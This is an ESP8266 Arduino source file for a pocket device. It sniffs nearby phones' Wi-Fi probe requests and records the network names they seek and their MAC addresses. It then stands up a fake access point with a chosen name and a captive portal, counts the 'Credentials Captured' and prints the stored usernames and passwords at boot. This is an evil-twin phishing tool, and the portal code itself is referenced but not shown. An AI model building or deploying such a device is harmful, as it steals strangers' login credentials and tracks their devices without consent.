extern "C" {
  #include <user_interface.h>
}
#include <ESP8266WiFi.h>
#include <FS.h>
#include <Wire.h>  // Only needed for Arduino 1.6.5 and earlier
#include "SSD1306.h" // alias for `#include "SSD1306Wire.h"`
#include <ClickButton.h>
#include <WiFiClient.h>
#include <DNSServer.h>
#include <EEPROM.h>
#include <Hash.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFSEditor.h>
#include "logo.h"

/* ================================
  Constant Definitions
=================================*/

#define DATA_LENGTH           112

#define TYPE_MANAGEMENT       0x00
#define TYPE_CONTROL          0x01
#define TYPE_DATA             0x02
#define SUBTYPE_PROBE_REQUEST 0x04
#define SUBTYPE_BEACON        0x08

#define STATE0_DURATION  2000
#define STATE1_DURATION 10000
#define STATE3_DURATION  5000


/*=====================================================
  Start of Global Data section
=====================================================*/

struct RxControl {
 signed rssi:8; // signal intensity of packet
 unsigned rate:4;
 unsigned is_group:1;
 unsigned:1;
 unsigned sig_mode:2; // 0:is 11n packet; 1:is not 11n packet;
 unsigned legacy_length:12; // if not 11n packet, shows length of packet.
 unsigned damatch0:1;
 unsigned damatch1:1;
 unsigned bssidmatch0:1;
 unsigned bssidmatch1:1;
 unsigned MCS:7; // if is 11n packet, shows the modulation and code used (range from 0 to 76)
 unsigned CWB:1; // if is 11n packet, shows if is HT40 packet or not
 unsigned HT_length:16;// if is 11n packet, shows length of packet.
 unsigned Smoothing:1;
 unsigned Not_Sounding:1;
 unsigned:1;
 unsigned Aggregation:1;
 unsigned STBC:2;
 unsigned FEC_CODING:1; // if is 11n packet, shows if is LDPC packet or not.
 unsigned SGI:1;
 unsigned rxend_state:8;
 unsigned ampdu_cnt:8;
 unsigned channel:4; //which channel this packet in.
 unsigned:12;
};

struct SnifferPacket{
    struct RxControl rx_ctrl;
    uint8_t data[DATA_LENGTH];
    uint16_t cnt;
    uint16_t len;
};

struct SSID{
    String name;
    String MAClist[10];
    int uniques = 0;
    signed average_rssi;
};

struct SSID SSIDlist[10];

int SSIDcount = 0;
int probeCount = 0;
int capturecount = 0;

struct credentials{
  char username[32];
  char password[32];
};

int addr = 0;
int previousCaptures = 0;

struct credentials capturedCredentials[100];

const int LEDpin = 2; //GPIO2 D0?, different on each board? use GPIO13 in final

int numberOfInterrupts = 0;
volatile byte interruptCounter = 0;
const int interruptPin = 5; //GPIO5 D1
ClickButton selectButton(interruptPin, LOW, CLICKBTN_PULLUP);

int numberOfInterrupts2 = 0;
volatile byte interrupt2Counter = 0;
const int interrupt2Pin = 4; //GPIO4 D2
ClickButton updownButton(interrupt2Pin, LOW, CLICKBTN_PULLUP);

long timeOfLastClick = 0;

typedef void (*Screen)(void);
SSD1306  display(0x3c, 14, 12); //GPIO14 12 D5, D6
int screenState = 0;
long timeOfLastModeSwitch = 0;

/*=====================================================
  End of Global Data section
=====================================================*/

/*=====================================================
  Probe request sniffer
=====================================================*/
static void showMetadata(SnifferPacket *snifferPacket) {

  unsigned int frameControl = ((unsigned int)snifferPacket->data[1] << 8) + snifferPacket->data[0];

  uint8_t version      = (frameControl & 0b0000000000000011) >> 0;
  uint8_t frameType    = (frameControl & 0b0000000000001100) >> 2;
  uint8_t frameSubType = (frameControl & 0b0000000011110000) >> 4;
  uint8_t toDS         = (frameControl & 0b0000000100000000) >> 8;
  uint8_t fromDS       = (frameControl & 0b0000001000000000) >> 9;
  uint8_t SSID_length  = snifferPacket->data[25];

  // Only look for probe request packets
  if (frameType != TYPE_MANAGEMENT || frameSubType != SUBTYPE_PROBE_REQUEST){
      return;
  }
  // Filter out broadcast probes
  if(SSID_length == 0){
      return;
  }

  // Save SSID and client MAC address of current probe request
  String SSIDcurrent = getSSID(26, SSID_length, snifferPacket->data);
  printf("%s, ", SSIDcurrent.c_str());

  char *addr = "00:00:00:00:00:00";
  String MACcurrent = getMAC(addr, snifferPacket->data, 10);
  printf("%s, ", MACcurrent.c_str());

  Serial.println(probeCount);

  // LED blink on probe request
  digitalWrite(LEDpin, LOW);

  //Matching logic, convert to function
  int match = 0;
  int trig = 0;
  int i = 0;
  int j = 0;

  for ( i = 0 ; i < SSIDcount ; i++){
      if(SSIDcurrent == SSIDlist[i].name){
          trig++;
          match = i;
      }
  }

  if (trig == 0){
    probeCount++;
    //Limit to 10 SSIDs
    if (SSIDcount > 9){
        return;
    }
    SSIDcount++;
    match = SSIDcount-1;
    SSIDlist[match].name = SSIDcurrent;
    SSIDlist[match].average_rssi = snifferPacket->rx_ctrl.rssi;
  }

  int matchMAC = 0;
  trig = 0;
  for ( j = 0 ; j < SSIDlist[match].uniques ; j++){
      if(MACcurrent == SSIDlist[match].MAClist[j]){
          trig++;
          matchMAC = j;
          SSIDlist[match].average_rssi = (SSIDlist[match].average_rssi + snifferPacket->rx_ctrl.rssi)/2;

      }
  }
  if (trig == 0){
    //Limit to 10 MACs to prevent overflow
    if (SSIDlist[match].uniques > 9){
        return;
    }
    SSIDlist[match].uniques++;
    matchMAC = SSIDlist[match].uniques - 1;
    SSIDlist[match].MAClist[matchMAC] = MACcurrent;
  }

  //Perform hex dump of captured packet to serial
  //hexDump(snifferPacket->data);

}

static void ICACHE_FLASH_ATTR sniffer_callback(uint8_t *buffer, uint16_t length) {
    struct SnifferPacket *snifferPacket = (struct SnifferPacket*) buffer;
    showMetadata(snifferPacket);
}

static String getSSID(uint16_t start, uint16_t size, uint8_t* data) {
    String ssid = "";
    char letter;
    for(uint16_t i = start; i < DATA_LENGTH && i < start+size; i++) {
        letter = data[i];
        ssid += letter;
    }
    return ssid;
}

static String getMAC(char *addr, uint8_t* data, uint16_t offset) {
    sprintf(addr, "%02x:%02x:%02x:%02x:%02x:%02x", data[offset+0], data[offset+1],
                    data[offset+2], data[offset+3], data[offset+4], data[offset+5]);
    String MAC(addr);
    return MAC;
}

//Sorting logic
void SSIDsort(){
  struct SSID SSIDswap;
  int i, j;

  for ( i = 0 ; i < SSIDcount - 1 ; i++){
      for ( j = 0 ; j < SSIDcount - i - 1 ; j++){
        if(SSIDlist[j].average_rssi < SSIDlist[j+1].average_rssi){
            SSIDswap = SSIDlist[j];
            SSIDlist[j] = SSIDlist[j+1];
            SSIDlist[j+1] = SSIDswap;
        }
      }
  }

  for ( i = 0 ; i < SSIDcount - 1 ; i++){
      for ( j = 0 ; j < SSIDcount - i - 1 ; j++){
        if(SSIDlist[j].uniques < SSIDlist[j+1].uniques){
            SSIDswap = SSIDlist[j];
            SSIDlist[j] = SSIDlist[j+1];
            SSIDlist[j+1] = SSIDswap;
        }
      }
  }
}

/*=====================================================
  End of Probe Request Sniffer
=====================================================*/

/*static void hexDump(uint8_t* data){
    int j = 0;
    printf("000%02x  ", j);

    for(uint16_t i = 0; i < DATA_LENGTH ; i++) {
        j++;
        printf("%02x ", data[i]);
        if(j%8 == 0){
            Serial.print(" ");
        }
        if(j%16 == 0){
            Serial.println();
            printf("000%02x  ", j);
        }
    }
}*/

/*=====================================================
  Screen states
=====================================================*/

static void ICACHE_FLASH_ATTR displayLogo() {
    // see http://blog.squix.org/2015/05/esp8266-nodemcu-how-to-create-xbm.html
    // on how to create xbm files
    display.drawXbm(15, 0, logo_width, logo_height, logo_bits);
}

String scan = "Scanning";
static void ICACHE_FLASH_ATTR displayScanning() {

  int progress = (((millis()-timeOfLastModeSwitch)*100)/STATE1_DURATION);

  // draw the progress bar
  display.drawProgressBar(0, 32, 120, 10, progress);

  display.setTextAlignment(TEXT_ALIGN_LEFT);

  display.drawString(41, 5, scan);
}

static void ICACHE_FLASH_ATTR displaySSIDs() {
  // setup SSID table
  display.setTextAlignment(TEXT_ALIGN_LEFT);
  display.drawString(0, 0, "SSID");
  display.drawString(90, 0, "uniques");

  String ap; //temporary storage for SSID

  if (numberOfInterrupts2 < 5){
    for ( int i = 0 ; i < 5 && i < SSIDcount; i++){
        display.drawRect(0, (numberOfInterrupts2+1)*10, 80, 12);
        ap = SSIDlist[i].name;
        if (ap.length() > 12){
            ap.remove(12, 20);
            ap += "...";
        }
        display.drawString(0, (i+1)*10, ap);
        display.drawString(90, (i+1)*10, String(SSIDlist[i].uniques));
    }
  }else{
    for ( int i = 0 ; i < 5 && i < SSIDcount+i-5 ; i++){
        display.drawRect(0, 50, 80, 12);
        ap = SSIDlist[numberOfInterrupts2+i-4].name;
        if (ap.length() > 12){
            ap.remove(12, 20);
            ap += "...";
        }
        display.drawString(0, (i+1)*10, ap);
        display.drawString(90, (i+1)*10, String(SSIDlist[numberOfInterrupts2+i-4].uniques));
    }
  }
}

static void ICACHE_FLASH_ATTR displayAPsetup() {

  // draw the progress bar
  int progress = (((millis()-timeOfLastModeSwitch)*100)/2700);

  // draw the percentage as String
  display.setTextAlignment(TEXT_ALIGN_CENTER);

  display.drawString(64, 15, "Setting up");
  display.drawString(64, 30, SSIDlist[numberOfInterrupts2].name + " Access Point");
  if (millis() - timeOfLastModeSwitch < 2700){
      display.drawProgressBar(32, 48, 60, 12, progress);
  }else{
      display.drawString(64, 46, "Ready");
  }
}

static void ICACHE_FLASH_ATTR displayKEYcapture(){
  display.setTextAlignment(TEXT_ALIGN_CENTER);
  display.drawString(64, 0, "Captive portal on");
  display.drawString(64, 15, SSIDlist[numberOfInterrupts2].name + " Access Point");
  display.drawString(64, 30, "Credentials Captured:");
  display.drawString(64, 45, String(capturecount));
}

static void ICACHE_FLASH_ATTR displayTimeout(){
  display.clear();
}

static void ICACHE_FLASH_ATTR displayAdmin(){
  display.setTextAlignment(TEXT_ALIGN_CENTER);
  display.drawString(64, 0, "You are now sudoed");
  display.drawString(64, 10, "Clear EEPROM");
  display.drawString(64, 20, "Set Timeout");
  //display.drawString(64, 10, "View Credentials");
  display.drawRect(15, (numberOfInterrupts2+1)*10, 94, 12);
}

static void ICACHE_FLASH_ATTR screenTimeout( long timeout ){
  if(millis() - timeOfLastModeSwitch > timeout){
    if (timeOfLastClick == 0 || millis() - timeOfLastClick > timeout || WiFi.softAPgetStationNum() > 0){
      screenState = 5;
    }
  }
}

/*=====================================================
  End of Screen states
=====================================================*/


/*=====================================================
  Channel hopping callback
=====================================================*/

#define CHANNEL_HOP_INTERVAL_MS   1000
static os_timer_t channelHop_timer;

void channelHop()
{
    // hoping channels 1-14
    uint8 new_channel = wifi_get_channel() + 1;
    if(new_channel > 14)
        new_channel = 1;
    wifi_set_channel(new_channel);
}

/*=====================================================
  Setup function
=====================================================*/

#define DISABLE 0
#define ENABLE  1

Screen screens[] = { displayLogo, displayScanning, displaySSIDs, displayAPsetup, displayKEYcapture, displayTimeout, displayAdmin};
//int demoLength = (sizeof(screens) / sizeof(Screen));

void setup() {

    //Start serial connection
    Serial.begin(115200);

    pinMode(LEDpin, OUTPUT);
    digitalWrite(LEDpin, HIGH);
    // setup interrupt pins
    pinMode(interruptPin, INPUT_PULLUP);
    //attachInterrupt(interruptPin, handleInterrupt, FALLING);
    pinMode(interrupt2Pin, INPUT_PULLUP);
    selectButton.debounceTime = 30;
    updownButton.debounceTime = 30;
    selectButton.multiclickTime = 0;
    updownButton.multiclickTime = 0;
    //attachInterrupt(interrupt2Pin, handleInterrupt2, FALLING);

    // set the WiFi chip to "promiscuous" mode aka monitor mode

    wifi_set_opmode(STATION_MODE);
    wifi_set_channel(1);
    wifi_promiscuous_enable(DISABLE);
    wifi_set_promiscuous_rx_cb(sniffer_callback);
    wifi_promiscuous_enable(ENABLE);

    // setup the channel hoping callback timer
    os_timer_disarm(&channelHop_timer);
    os_timer_setfn(&channelHop_timer, (os_timer_func_t *) channelHop, NULL);
    os_timer_arm(&channelHop_timer, CHANNEL_HOP_INTERVAL_MS, 1);

    // Initialising the UI will init the display too.
    display.init();
    display.flipScreenVertically();
    display.setFont(ArialMT_Plain_10);

    //clearEEPROM(); //uncomment to clear stored credentials

    Serial.println();
    Serial.println("Recovered credentials:");
    int i = 0;
    while(previousCaptures == 0 ){
      loadCredentials(i);
      Serial.println(capturedCredentials[i].username);
      Serial.println(capturedCredentials[i].password);
      Serial.println();
      i++;
    }
}


/*=====================================================
  Main Loop
=====================================================*/

void loop() {

  updownButton.Update();
  selectButton.Update();

  // clear the display
  display.clear();

  // draw the current Screen method
  screens[screenState]();

  display.setTextAlignment(TEXT_ALIGN_RIGHT);
  display.drawString(10, 128, String(millis()));
  // write the buffer to the display
  display.display();

  if(updownButton.clicks == 1 || selectButton.clicks == 1){
    timeOfLastClick = millis();
    Serial.println(timeOfLastClick);
  }

  //enter admin menu
  /*if(updownButton.clicks == 1 && selectButton.clicks == 1){
    //timeOfLastClick = millis();
    Serial.println("sudo access granted");
    screenState = 6;
    numberOfInterrupts2 = 0;
  }

  if(screenState == 6){
    if(updownButton.clicks == 1){
      numberOfInterrupts2++;
    }
    if (numberOfInterrupts2 > 3){
        numberOfInterrupts2 = 0;
    }
  }*/

  // Clear screen and enter deep sleep
  if(screenState == 5){
      ESP.deepSleep(0);
  }

  if(screenState ==0){
    if ((millis() - timeOfLastModeSwitch > STATE0_DURATION)) {

      screenState = 1;
      timeOfLastModeSwitch = millis();
      timeOfLastClick = millis();
    }

  }

  // Escape Scanning screen after 10s
  if(screenState == 1){
    if ((millis() - timeOfLastModeSwitch > STATE1_DURATION)) {

      SSIDsort();

      screenState = 2;
      timeOfLastModeSwitch = millis();
      timeOfLastClick = millis();

      // Disable promscious mode and turn off channel hop before setting up AP
      wifi_promiscuous_enable(DISABLE);
      wifi_set_promiscuous_rx_cb(NULL);
      os_timer_disarm(&channelHop_timer);
    }
  }

  // Display SSID list
  if( screenState == 2){

    // 10s Time out on SSID list
    screenTimeout(10000);

    // increment through list on button click
    if(updownButton.clicks == 1){
      numberOfInterrupts2++;
    }

    // Go back to top of list
    if(numberOfInterrupts2 == SSIDcount){
      numberOfInterrupts2 = 0;
    }

    // Handle selection interrupt
    if(selectButton.clicks == 1){
        interruptCounter++;
      }
    }

  // Setup captive portal
  if (interruptCounter == 1){

      interruptCounter--;
      numberOfInterrupts++;

      screenState = 3;
      timeOfLastModeSwitch = millis();

      yield();

      asyncCaptiveSetup();

  }

  // Escape AP Setup screen after 5s
  if(screenState == 3){
    if(millis() - timeOfLastModeSwitch > STATE3_DURATION){
      screenState = 4;
      timeOfLastModeSwitch = millis();
    }
  }

  // Display Credential Capture
  if(screenState == 4){

    // 60s timeout on captive portal
    screenTimeout(60000);
    captiveLoop();

  }

  digitalWrite(LEDpin, HIGH);

}
